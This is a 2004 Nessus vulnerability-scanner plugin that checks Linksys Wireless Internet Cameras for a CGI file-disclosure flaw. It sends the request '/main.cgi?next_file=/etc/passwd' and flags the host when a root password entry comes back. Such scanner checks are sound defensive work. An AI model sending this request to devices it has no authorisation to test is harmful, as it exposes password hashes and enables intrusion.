#
# This script was written by Noam Rathaus
#
# GPL
#
# Contact: sf@cicsos.dk
# Subject: Linksys Wireless Internet Camera
# Date: 	Jun 23 02:05:11 2004

if(description)
{
 script_id(13636);
 script_bugtraq_id(10533);
 script_version("$Revision: 1.2 $");
 script_name(english:"Linksys Wireless Internet Camera File Disclosure");
 
 
 desc["english"] = "
The Linksys Wireless Internet Camera contains a CGI that allows remote
attackers to disclosue sensitive files stored on the server.

An attacker may use this CGI to disclosue the password file and from it
the password used by the root use (the MD5 value).

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for the Linksys CGI Disclosure";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "Misc.";
 script_family(english:family["english"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

req = http_get(item:"/main.cgi?next_file=/etc/passwd", port:port);

res = http_keepalive_send_recv(port:port, data:req);
if ( res == NULL ) exit(0);

if ( egrep ( pattern:".*root:.*:0:[01]:.*", string:res) )
	security_hole(port);

